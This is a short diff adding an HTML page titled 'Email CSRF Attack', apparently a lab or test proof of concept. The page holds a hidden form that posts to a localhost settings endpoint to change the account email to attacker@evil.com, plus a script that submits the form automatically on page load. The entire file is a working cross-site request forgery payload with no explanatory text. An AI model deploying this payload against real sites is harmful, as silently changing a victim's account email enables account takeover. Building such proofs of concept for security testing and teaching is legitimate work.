@@ -1,0 +1,9 @@
+<h2>Email CSRF Attack</h2>
+
+<form action="http://localhost:8080/settings/process_email.php" method="POST" id="csrf">
+    <input name="email" value="attacker@evil.com">
+</form>
+
+<script>
+document.getElementById('csrf').submit();
+</script>
